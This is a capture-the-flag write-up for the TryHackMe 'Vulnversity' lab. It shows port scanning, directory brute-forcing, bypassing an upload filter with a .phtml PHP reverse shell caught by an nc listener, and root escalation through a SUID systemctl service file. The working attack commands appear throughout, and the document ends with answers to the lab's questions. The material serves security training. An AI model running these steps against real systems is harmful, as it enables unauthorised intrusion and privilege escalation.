# Tryhackme - Vulnversity - Linux

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -Pn -p- 10.10.72.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 14:04 EDT
Warning: 10.10.72.158 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.72.158
Host is up (0.22s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           vsftpd 3.0.3
22/tcp    open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp   open     netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn   Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1281/tcp  filtered healthd
3128/tcp  open     http-proxy    Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp  open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
[STRIPPED]
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-05-08T14:16:34-04:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-08T18:16:34
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 710.19 seconds
```

## Initial foothold

If we go to http://10.10.72.158:3333/ we have a website.
However the content is not really useful for us.
We can run gobuster, that is how we find the folder internal
```
┌──(root💀kali)-[~/Documents/tryhackme/vulnversity]
└─# gobuster dir -u http://10.10.72.158:3333/ --wildcard -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.158:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/08 14:17:29 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.72.158:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.72.158:3333/css/]   
/js                   (Status: 301) [Size: 316] [--> http://10.10.72.158:3333/js/]    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.72.158:3333/fonts/] 
/internal             (Status: 301) [Size: 322] [--> http://10.10.72.158:3333/internal/]
```
- This a page with a file upload fonctionnality. This is perfect for a reverse shell  
![image](https://user-images.githubusercontent.com/96747355/167309849-79c67895-2633-4426-897a-7d7ad3aa1f5a.png)  
- After a few tries with burp, the accepted exentions is phtml. You can also fuzz it with burp intruder and make a grep match on "extension not allowed" to see which one will be allowed.
- We edit php revershell (on kali we have it preinstalled) `cp /usr/share/webshells/php/php-reverse-shell.php .` we rename it in the accepted extension `mv php-reverse-shell.php php-reverse-shell.phtml` 
- `nc -lvp 4444` We set up our listener
- Now as mentioned we just need to go to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml ` to execute our shell (if this was not specified we could have run gobuster in the internal folder
- We get a shell as `www-data`


## Privesc

- Now let's enumerate our ways to privesc
- `find / -perm -u=s -type f 2>/dev/null` We have a few files with suid bit on
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
- We have a GTFOBins entry for `/bin/systemctl` [here](https://gtfobins.github.io/gtfobins/systemctl/#suid)
- Let's try the exploitation
  - It creates a service in an env
  - It will create a temp file in the syst as a service
  - This will execute a command with bin/sh (in GTFObins it will execute id) in our case we could try to output our root flag in the output folder. It will then set a link and enable it
- Here is our modified script
```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
- Once we pasted all our commands above we just need to `cat /tmp/output` and this will give us the root flag.

## Questions

### Task 2

- `Scan the box, how many ports are open?` Answer `6`
- `What version of the squid proxy is running on the machine?`Answer `3.5.12`
- `How many ports will nmap scan if the flag -p-400 was used?` Answer `400`
- `Using the nmap flag -n what will it not resolve?` Answer `DNS`
- `What is the most likely operating system this machine is running?` Answer `Ubuntu`
- `What port is the web server running on?` Answer `3333`

### Task 3

- `What is the directory that has an upload form page?` Answer `/internal/`

#### Task 4

- `Run this attack, what extension is allowed?` Answer `phtml`
- `What is the name of the user who manages the webserver?` Answer `bill`
- `What is the user flag?` I will let you do this on your own Hint: `cat /home/bill/user.txt`

#### Task 5

- `On the system, search for all SUID files. What file stands out?` Answer `/bin/systemctl`
- `Become root and get the last flag (/root/root.txt)` I will let you do this on your own Hint: `cat /root/root.txt`
